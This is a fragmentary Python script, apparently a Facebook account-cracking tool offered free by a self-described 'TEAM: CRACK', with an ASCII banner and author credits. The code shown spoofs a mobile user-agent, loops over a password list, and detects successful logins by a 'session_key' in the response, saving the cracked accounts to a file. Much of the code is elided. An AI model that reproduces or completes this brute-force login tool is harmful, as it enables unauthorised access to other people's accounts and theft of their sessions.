...
ua_x = {"Mozilla/5.0 (iPad; CPU OS 8_1_1 like Mac OS X; sl-SI) AppleWebKit/534.2.4 (KHTML, like Gecko) Version/4.0.5 Mobile/8B113 Safari/6534.2.4;]"}
...
|_______/|_____||________||____| |____||________| 
                                                  
                                                 \033[1;97mXD                         
----------------------------------------------

TEAM :  CRACK
BROTHER ❤️: ADIL X WAQAR
Facebook :TRICKER MR BILQL
Owner Name: BILAL AHMED
FRIEND : WAQAR
Tools Type: Free
...
def Main_ZIDI():
        ...
        if shm =='1':
            ...
            os.system('xdg-open https://www.facebook.com/profile.php?id=100088392859656/?ref=share')
            Main_ZIDI()
        elif shm =='0':
    ...
    try:
        ...
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        file_path = os.path.join(folder_path, 'ALPARSALAN-CP.txt')
